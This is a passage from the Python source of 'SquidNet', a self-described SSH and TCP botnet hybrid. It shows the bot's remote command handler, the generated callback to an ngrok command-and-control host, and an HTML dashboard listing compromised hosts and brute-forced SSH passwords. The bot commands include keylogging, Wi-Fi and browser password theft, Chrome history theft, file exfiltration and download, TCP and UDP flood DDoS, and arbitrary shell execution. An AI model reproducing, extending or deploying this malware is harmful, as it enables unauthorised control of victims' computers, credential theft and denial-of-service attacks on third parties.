                        self.send("Started to send keyboard inputs.")
                        self.logging = True
                elif self.msg.startswith("!stopkeylog"):
                    if self.logging:
                        self.send("Stopped Keylogging.")
                    self.logging = False
                elif self.msg.startswith('!getwifi'):
                    wifi_passwords = self.obtainwifipass()
                    self.send(wifi_passwords)
                elif self.msg.startswith('!savefile'):
                    file = self.returnsecondstr(self.msg)
                    self.sendfile(file)
                elif self.msg.startswith('!viewfilecontent'):
                    file = self.returnsecondstr(self.msg)
                    self.file_content(file)
                elif self.msg.startswith("!getchromehistory"):
                    self.send_history()
                elif self.msg.startswith('!mkdir'):
                    main_msg = self.msg.split()
                    dirname = main_msg[1]
                    self.mkdir(dirname)
                    self.send(f"Successfully Created {dirname}")
                elif self.msg.startswith('!getcwd'):
                    self.send(os.getcwd())
                elif self.msg.startswith('!getos'):
                    self.send(sys.platform)
                elif self.msg.startswith('!gotowebsite'):
                    main_msg = self.msg.split()
                    url = main_msg[1]
                    self.gotowebsite(url)
                elif self.msg.startswith('!dwnldfile'):
                    main_msg = self.msg.split()
                    src = main_msg[1]
                    file = main_msg[2]
                    self.getfrinternet(src, file)
                elif self.msg.startswith('!getpasswords'):
                    if sys.platform == "win32":
                        passwords = self.main_password_yoinker()
                        self.connection.send(passwords.encode())
                    else:
                        self.connection.send("Running on a non-windows machine - Cannot get passwords!")
                elif self.msg.startswith("!editfile"):
                    try:
                        main_msg = self.msg.split()
                        self.editfile = open(str(main_msg[1]), "rb")
                        self.editfile.close()
                        self.filename = self.editfile.name
                        self.fileeditor = True
                        self.send(f"File editing mode activated for file {self.filename}")
                    except:
                        self.send("File cannot be opened on this computer.".encode())
                        self.fileeditor = False
                elif self.msg.startswith("!mkfile"):
                    msg_split = self.msg.split()
                    try:
                        filename = msg_split[1]
                        file = open(str(filename), "w")
                        file.close()
                        self.send(f"File {filename} has been created in {os.getcwd()}".encode())
                    except:
                        self.send("Error with creating files.".encode())
                elif self.msg.startswith("!rickroll"):
                    if sys.platform == "win32":
                        for i in range(10):
                            os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO")
                    else:
                        for i in range(10):
                            os.system("open https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO")
                    self.send("Just got rick rolled!".encode())
                elif self.msg.startswith("!tcpflood"):
                    msg_split = self.msg.split()
                    ip = msg_split[1]
                    try:
                        port = int(msg_split[2])
                    except:
                        port = 80
                    try:
                        delay = float(msg_split[3])
                    except:
                        delay = 0
                    try:
                        pkt_size = int(msg_split[4])
                    except:
                        pkt_size = 1024
                    self.tcpflood = TCP_UDP_Flood(ip, port, delay, pkt_size)
                    self.tcp_flood = threading.Thread(target=self.tcpflood.TCP_Flood)
                    self.tcp_flood.start()
                elif self.msg.startswith("!udpflood"):
                    msg_split = self.msg.split()
                    ip = msg_split[1]
                    try:
                        port = int(msg_split[2])
                    except:
                        port = 80
                    try:
                        delay = float(msg_split[3])
                    except:
                        delay = 0
                    try:
                        pkt_size = int(msg_split[4])
                    except:
                        pkt_size = 1024
                    self.udpflood = TCP_UDP_Flood(ip, port, delay, pkt_size)
                    self.udp_flood = threading.Thread(target=self.udpflood.UDP_Flood)
                    self.udp_flood.start()
                else:
                    cmd = subprocess.Popen(self.msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout = cmd.stdout.read()+cmd.stderr.read()
                    self.send(stdout)
        except Exception as e:
            self.send(f"Error in script: {e}".encode())
ip = '""" + self.ngroklink + """'
port = """ + str(self.ngrokport) + """
key = """ + str(self.key) + """
bot = Bot(ip, port, key)
#-----End-Of-Bot-----#
        """
        return script
class Web_Interface:
    """Web Interface for seeing connections, some general info about them, and also
    info about this script. There are some important info about some of the important
    variables in the server, so that the User can learn more about it."""
    def __init__(self, ip, port):
        """Initiation of the web-server, also where all the important variables are defined,
        as well as the starting of the server and threads."""
        self.ip = "localhost"
        self.port = port
        self.working = False
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((ip, port))
            self.working = True
        except Exception as e:
            print(f"\n[+] Web-Interface is unable to start due to error: {e}")
        if self.working:
            self.packet = ""
            self.listener = threading.Thread(target=self.listen)
            self.listener.start()
            self.packets = threading.Thread(target=self.packetmaker)
            self.packets.start()
    def packetmaker(self):
        """This function generates the packet to send
        to the client and also for updating the Web-Interface."""
        while True:
            try:
                conn_bots = ""
                for x in botnet.botnet.info:
                    conn_bots += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>" + x.split()[4] + "</td>\n</tr>\n"
                conn_admin = ""
                for x in botnet.botnet.admininfo:
                    conn_admin += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + \
                                  x.split()[
                                      2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>" + x.split()[
                                      4] + "</td>\n</tr>\n"
                conn_ssh = ""
                for x in botnet.botnet.ssh_info:
                    conn_ssh += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
                        2] + "</td>\n</tr>\n"
                self.packet = """
                <!DOCTYPE html>
                <html lang="en">
                <meta charset="UTF-8">
                <title>SquidNet Web-Interface</title>
                <head>
                <style>
                        table {
                            border: 3px solid black;
                            font-size: 50px
                            border-collapse: collapse;
                            font: arial;

                        }

                        td, th {
                            border: 1px solid black;
                            padding: 5px;

                        }

                    </style>
                </head>
                <body>
                <h1>SquidNet Web Interface<h1>
                <h3>(Clearly HTML is not my base language so it doesn't look too good)<h3>
                <h1>Connections To the Botnet<h1>
                <table>
                <thead>
                <tr>
                <th>Hostname</th>
                <th>IP Address</th>
                <th>UserName</th>
                <th>Connection</th>
                <th>OS</th>
                </tr>
                </thead>
                <tbody>
                """ + str(conn_bots) + """
                </tbody>
                </table>
                <h1>Admin Connections To the Botnet<h1>
                <table>
                <thead>
                <tr>
                <th>Hostname</th>
                <th>IP Address</th>
                <th>UserName</th>
                <th>Connection</th>
                <th>OS</th>
                </tr>
                </thead>
                <tbody>
                """ + str(conn_admin) + """
                </tbody>
                </table>
                <h1>SSH Connections to the Botnet</h1>
                <table>
                <thead>
                <tr>
                <th>Hostname</th>
                <th>IP Address</th>
                <th>Password</th>
                </tr>
                </thead>
                <tbody>
                """ + str(conn_ssh) + """
                </tbody>
                </table>
                <h2>About:</h2>
                </h4>Squidnet is an SSH and TCP Botnet Hybrid. The Botnet has the ability to take control of computers compromised by the
                bot script, as well as gaining access to ssh servers. It also has a form of security in which admins need to provide a username and
                a password in order to gain access. They will be kicked if they do not enter the correct credentials. The Bots can do many
                things including DDoS Attacks(HTTP, TCP and UDP Floods), sending their passwords to the Botnet, editing files remotely,
                and many more.</h4>
                <h2>Important Info</h2>
                <h4>Server Log file: """ + os.getcwd() + """\\servlog.txt - Good for checking for errors and server output.</h4>
                <h4>Server IP: """ + str(botnet.botnet.ngroklink) + """:""" + str(botnet.botnet.ngrokport) + """ - How Bots will connect to the Botnet.</h4>
                <h4>Admin Username: """ + str(botnet.botnet.admin_name) + """ - Username Used by Admins to obtain access to the Botnet</h4>
                <h4>Admin Password: """ + str(botnet.botnet.passw) + """ - Password Used by Admins to obtain access to the Botnet.</h4>
                <h4>Encryption Token: """ + str(botnet.botnet.key) + """ - Used for encrypting files on the bots.</h4>
                <h4>Brute-Forcing-File: """ + str(botnet.botnet.passfilename) + """ - Used for SSH-Brute-Forcing.</h4>
                </body>
                </html>
                            """
                time.sleep(1)
            except:
                pass
    def listen(self):
        """Listens for and accepts connections."""
        while True:
            self.server.listen()
            conn, ip = self.server.accept()
            handler = threading.Thread(target=self.handler, args=(conn,))
            handler.start()
    def handler(self, conn):
        """Handles the connections and sends the HTTP Code to the client
        to view the Web Interface."""
        conn.send('HTTP/1.0 200 OK\n'.encode())
        conn.send('Content-Type: text/html\n'.encode())
        conn.send('\n'.encode())
        conn.send(self.packet.encode())
        if sys.platform == "win32":
            pass
        else:
            conn.close()
if __name__ == '__main__':
    """Clears CMD Output."""
    if sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")
    try:
        """Tries to import this module."""
        import paramiko
    except:
        """Since paramiko is not an official Python Module,
        the user may need to download Paramiko themself."""
        print(Botnet.log_logo())
        print("\n[+] Missing Module: Paramiko\n[+] If you have python 3 installed, try: pip install paramiko")
        sys.exit()
    botnet = ArguementParse()
